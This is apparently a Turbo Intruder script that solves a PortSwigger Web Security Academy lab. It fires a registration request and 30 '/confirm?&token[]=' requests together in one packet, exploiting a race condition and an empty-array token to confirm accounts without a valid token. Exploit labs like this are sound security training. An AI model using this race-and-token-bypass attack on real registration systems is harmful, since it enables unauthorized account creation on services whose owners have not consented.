def queueRequests(target, wordlists):

    # if the target supports HTTP/2, use engine=Engine.BURP2 to trigger the single-packet attack
    # if they only support HTTP/1, use Engine.THREADED or Engine.BURP instead
    # for more information, check out https://portswigger.net/research/smashing-the-state-machine
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=10,
                           engine=Engine.BURP2
                           )

    # the 'gate' argument withholds part of each request until openGate is invoked
    # if you see a negative timestamp, the server responded before the request was complete

    # Set your lab's host and phpsessionid
    req_confirm = '''POST /confirm?&token[]= HTTP/2
Host: 0ad700e4040084248155bc9a00560054.web-security-academy.net
Cookie: phpsessionid=1PnDPA2HM4bjJryNME1rfSn0xWlhXllF
Content-Length: 0
Content-Type: application/x-www-form-urlencoded

'''
    for attemp in range(10):
        username = 'user' + str(attemp)
        engine.queue(target.req, username, gate=str(attemp))
        for i in range(30):
            engine.queue(req_confirm, gate=str(attemp))
        engine.openGate(str(attemp))

    # once every 'race1' tagged request has been queued
    # invoke engine.openGate() to send them in sync
    # engine.openGate('race1')


def handleResponse(req, interesting):
    table.add(req)

